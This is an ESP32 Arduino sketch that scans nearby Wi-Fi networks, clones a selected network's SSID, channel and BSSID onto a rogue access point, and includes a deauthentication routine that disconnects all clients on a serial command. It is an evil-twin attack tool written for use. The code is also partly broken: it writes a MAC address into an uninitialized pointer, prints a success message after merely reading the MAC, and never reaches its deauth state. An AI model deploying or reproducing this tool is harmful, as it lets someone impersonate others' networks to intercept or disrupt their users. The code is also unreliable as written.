#include <WiFi.h>
#include "esp_wifi.h"

enum State {
    INIT,
    AP_SCAN,
    AP_SPOOF,
    DEAUTH,
};

enum State state = State::INIT;

struct AP_info {
    String ssid;
    int channel;
    uint8_t* mac;
};

AP_info spoof_info;
AP_info original_info;
bool menace {false};

void AccessPointScan() {
    Serial.println("Starting scan...");
    int n = WiFi.scanNetworks();
    Serial.println("Scan complete.");
    if (n == 0) {
        Serial.println("No networks found.");
    } else {
        Serial.printf("Found %d networks:\n", n);
        Serial.println("Select SSID:\t\t MAC Address:\n");
        for (int i = 0; i < n; ++i) {
        // Print SSID and MAC address
        Serial.printf("%d\t",i);
        Serial.print(WiFi.SSID(i).c_str());
        Serial.print("\t");
        Serial.println(WiFi.BSSIDstr(i).c_str());
        delay(10);
        }
    }
    delay(5000);
    if (Serial.available() > 0) {
        int x = Serial.parseInt();
        spoof_info = AP_info{WiFi.SSID(x), WiFi.channel(x), WiFi.BSSID(x)};
        state = State::AP_SPOOF;
        return;
    }
    WiFi.scanDelete();
}

void SpoofMACaddress() {
    WiFi.disconnect(true);
    WiFi.mode(WIFI_MODE_NULL);

    auto err = esp_wifi_set_mac(WIFI_IF_AP, spoof_info.mac);
    if (err == ESP_OK)Serial.println("Successful MAC Change");
    else Serial.println("!!!Failed MAC Change!!!");

    WiFi.mode(WIFI_MODE_AP);
    WiFi.softAP(spoof_info.ssid, "verysecurepassword", spoof_info.channel);

}

void DeauthAttack() {
    if (Serial.available() > 0) {
        String command = Serial.readString();
        if (command == "Yippee") {
        // loop channels
        menace= true; // deauth all
        } else if (command == "stop") {
        menace = false;
        }
    }
    if (menace)  {
        esp_wifi_deauth_sta(0); // deauth all
    }
}

void setup() {
    Serial.begin(115200);
    WiFi.mode(WIFI_MODE_STA); // Set ESP32 to Station mode
    WiFi.disconnect();        // Ensure we start clean
    delay(1000);               // Short delay to stabilize 100
    auto err = esp_wifi_get_mac(WIFI_IF_AP, spoof_info.mac);
    if (err == ESP_OK) Serial.println("Successful MAC Change");

    state = State::AP_SCAN;
}

void loop() {
    switch(state) {
        case State::AP_SCAN: AccessPointScan(); break;
        case State::AP_SPOOF: SpoofMACaddress(); break;
        // case State::DEAUTH: DeauthAttack(); break;
    }
}